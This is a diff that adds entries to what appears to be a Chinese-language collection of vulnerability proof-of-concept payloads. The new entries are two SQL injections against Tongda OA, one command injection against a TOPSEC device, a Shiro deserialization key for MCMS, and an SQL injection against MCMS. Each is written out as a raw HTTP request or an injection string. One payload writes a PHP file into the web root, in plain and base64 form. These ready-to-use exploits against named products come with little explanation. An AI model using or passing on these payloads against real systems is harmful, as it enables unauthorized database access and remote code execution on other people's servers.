@@ -750,6 +750,15 @@ https://xz.aliyun.com/t/10002
 ## 通达2017OA前台SQL注入 获取session
 
 ```
+POST /general/document/index.php/recv/register/insert HTTP/1.1
+Host:
+User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77
+Safari/537.36
+Content-Type:application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
+
 # -*- coding:utf-8 -*-
 import requests
 def hello(url, payload):
@@ -964,3 +973,67 @@ Content-Length: 856
 </soapenv:Envelope>
 ```
 
+## 铭飞/MCMS shiro 反序列化漏洞 CVE-2022-22928
+
+```
+key（AES GCM）: 4AvVhmFLUs0KTA3Kprsdag==
+构造链:CommonsBeanutils1  回显方式: AllEcho
+```
+
+## 天融信TOPSEC static_convert 远程命令执行漏洞
+
+```
+poc:
+view/IPV6/naborTable/static_convert.php?blocks[0]=||%20 echo%20%27%3C?php%20phpinfo();?%3E%27%20%3E%3E%20/var/www/html/1.php%0a
+
+Base64版:
+/view/IPV6/naborTable/static_convert.php?blocks[0]=||%20 echo%20PD9waHAgcGhwaW5mbygpOz8+%20%7Cbase64%20-d%20%3E%3E%20/var/www/html/1.php%0a
+```
+
+## 通达OA 11.5 SQL注入漏洞
+
+```
+POST /general/file_folder/swfupload_new.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
+Referer: http://192.168.202.1/general/meeting/myapply/details.php?affair=true&id=5&nosign=true&reminding=true
+X-Resource-Type: xhr
+Connection: close
+Host: 192.168.77.137
+Pragma: no-cache
+x-requested-with: XMLHttpRequest
+Content-Length: 433
+x-wvs-id: Acunetix-Deepscan/186
+Cache-Control: no-cache
+accept: */*
+origin: http://192.168.202.1
+Accept-Language: en-US
+Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+
+------------GFioQpMK0vv2
+Content-Disposition: form-data; name="ATTACHMENT_ID"
+
+1
+------------GFioQpMK0vv2
+Content-Disposition: form-data; name="ATTACHMENT_NAME"
+
+1
+------------GFioQpMK0vv2
+Content-Disposition: form-data; name="FILE_SORT"
+
+2
+------------GFioQpMK0vv2
+Content-Disposition: form-data; name="SORT_ID"
+
+0 RLIKE (SELECT  (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))
+------------GFioQpMK0vv2--
+```
+
+## 铭飞 mcms listExcludeApp sql注入漏洞
+
+```
+POST /mdiy/dict/listExcludeApp HTTP/1.1
+
+categoryId=1*
+```
+
+https://www.freebuf.com/vuls/345062.html
